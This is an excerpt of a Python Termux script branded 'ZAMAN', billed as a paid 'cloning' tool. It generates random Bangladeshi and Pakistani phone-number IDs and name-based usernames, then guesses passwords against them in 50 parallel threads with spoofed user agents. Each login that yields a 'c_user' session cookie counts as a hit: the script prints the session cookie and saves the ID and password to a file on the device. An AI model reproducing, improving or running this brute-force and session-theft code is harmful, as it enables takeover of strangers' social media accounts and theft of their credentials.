...
print('\n\033[1;37m install modules....\n It will take some seconds...ZAMAN   W8 update Tool..')
...
\033[1;37m######## ##     ## ##     ## ##     ## ##    ## 
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[✓]\033[1;92m DEVELOPER \033[1;37m>\033[1;92m ZAMAN 
\033[1;91m[✓]\033[1;92m TOOL TYPE \033[1;37m>\033[1;92m PAID \033[1;91m(\033[1;92m GAMES CLONING \033[1;91m)
\033[1;91m[✓]\033[1;92m GITHUB \033[1;37m   >\033[1;92m github.com/Zaman-404-ac
\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#---------------------[LOOP MENU]---------------------#
loop = 0
ok = []
...
def random_apk():
	...
	os.system('clear')
	banner()
	print(f"                {H} BD {K}CODE{P}  ");time.sleep(0.05)
	print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f"     \033[1;97m017 , 016 , 018 , 019 , 013") 
	print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f"                {H} PK {K}CODE{P}  ");time.sleep(0.05)
	print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	print(f"     \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Pakistani")
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : ZAMAN-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : ZAMAN-RNDM-CP.txt  ")
		print(f"\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
...
def random_gmail():
    ...
    print(f"  {K}EXAMPLE : \033[1;97mRakib , ZAMAN , Mehedi , Sumaiya , Ridoy") 
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[ZAMAN] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/ZAMAN-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[ZAMANUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}ZAMAN{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/ZAMAN-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [ZAMAN>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/ZAMAN-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
